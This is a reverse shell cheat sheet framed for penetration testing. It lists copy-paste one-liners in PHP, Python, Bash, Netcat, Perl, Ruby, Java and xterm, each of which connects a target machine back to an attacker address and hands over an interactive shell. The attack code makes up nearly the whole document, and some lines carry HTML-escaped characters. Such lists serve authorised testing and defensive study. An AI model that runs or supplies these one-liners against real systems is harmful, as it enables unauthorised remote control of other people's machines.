### Reverse Shell Cheat Sheet

If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you’ll probably want an interactive shell.

If it’s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port.  This page deals with the former.

Your options for creating a reverse shell are limited by the scripting languages installed on the target system – though you could probably upload a binary program too if you’re suitably well prepared.

The examples shown are tailored to Unix-like systems.  Some of the examples below should also work on Windows if you use substitute “/bin/sh -i” with “cmd.exe”.

Each of the methods below is aimed to be a one-liner that you can copy/paste.  As such they’re quite short lines, but not very readable.

#### Php :

```
php -r '$sock=fsockopen("192.168.0.5",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
```

#### Python :

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### Bash :

```
bash -i >& /dev/tcp/192.168.0.1/8080 0>&1
```

#### Netcat :

```
nc -e /bin/sh 192.168.0.5 4444
```

#### Perl :

```
perl -e 'use Socket;$i="192.168.0.5";$p=4545;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
```

#### Ruby :

```
ruby -rsocket -e'f=TCPSocket.open("192.168.0.5",4444).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
```

#### Java :

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/192.168.0.5/4444;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()
```

#### xterm :

```
xterm -display 192.168.0.5:4444
```
